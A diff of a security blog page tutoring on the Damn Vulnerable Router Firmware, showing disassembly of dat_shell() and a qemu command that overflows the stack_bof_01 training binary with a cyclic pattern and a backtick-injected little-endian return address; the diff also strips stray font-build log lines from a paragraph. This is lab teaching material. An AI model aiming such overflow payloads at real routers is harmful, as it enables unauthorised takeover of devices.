@@ -14,7 +14,7 @@
 <meta property="og:site_name" content="HandsOn Security">
 <meta property="og:description" content="Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1The Damn Vulnerable Router Firmware (DVRF) project by b1ack0wl will help you get a good start in understanding mips. Download the DVRF p">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-06-21T07:12:16.600Z">
+<meta property="og:updated_time" content="2019-07-09T22:36:42.617Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Learning with DVRF">
 <meta name="twitter:description" content="Getting Started with Damn Vulnerable Router Firmware (DVRF) v0.1The Damn Vulnerable Router Firmware (DVRF) project by b1ack0wl will help you get a good start in understanding mips. Download the DVRF p">
@@ -72,6 +72,8 @@
     <br>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" href="/2019/07/10/TempestSDR/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="/2019/06/14/Coercive-Man-in-the-Middle/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -233,7 +235,8 @@
 <p>This line grows the stack by an unsigned immediate (8) from the current stack pointer memory location (sp) and stores the new memory address in the stack pointer register. In this case, the stack pointer is going to decrease by 8 toward zero.<br>Instead of choosing the beginning address of <strong>dat_shell()</strong>, let’s pick four more advance instructions (0x0040095c). Otherwise the exploit does not work. We needto give the address after function prologue.</p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas dat_shell </span><br><span class="line">Dump of assembler code for function dat_shell:</span><br><span class="line">   0x00400950 &lt;+0&gt;:	lui	gp,0x5</span><br><span class="line">   0x00400954 &lt;+4&gt;:	addiu	gp,gp,-31872</span><br><span class="line">   0x00400958 &lt;+8&gt;:	addu	gp,gp,t9</span><br><span class="line">   0x0040095c &lt;+12&gt;:	addiu	sp,sp,-32</span><br><span class="line">   0x00400960 &lt;+16&gt;:	sw	ra,28(sp)</span><br><span class="line">   0x00400964 &lt;+20&gt;:	sw	s8,24(sp)</span><br><span class="line">   0x00400968 &lt;+24&gt;:	move	s8,sp</span><br></pre></td></tr></table></figure>
 
-<p>Crafting a new parameter, composed of the 204 set of characters of the pattern, plus echoing 0x0040095c in a <strong>Little Indian</strong> format with option <strong>-e</strong>, to enable the interpretation of backslash escapes.<br><br>LGM-Bold.ttf<br>INFO  Generated: lib/meslo-LG/MesloLGS-Regular.ttf<br>INFO  Generated: lib/meslo-LG/MesloLGL-Regular.ttf<br>INFO  Generated: lib/meslo-LG/MesloLGS-Bold.ttf<br>INFO  Generated: lib/font-awesome/webfonts/fa-brands-400.svg<br>INFO  Generated: lib/font-awesom<br>Let’s pass the argument to the program:</p>
+<p>Crafting a new parameter, composed of the 204 set of characters of the pattern, plus echoing 0x0040095c in a <strong>Little Indian</strong> format with option <strong>-e</strong>, to enable the interpretation of backslash escapes.</p>
+<p>Let’s pass the argument to the program:</p>
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"</span></span></span><br></pre></td></tr></table></figure>
 
 <p>Remote debugging again and remote debugging again:</p>
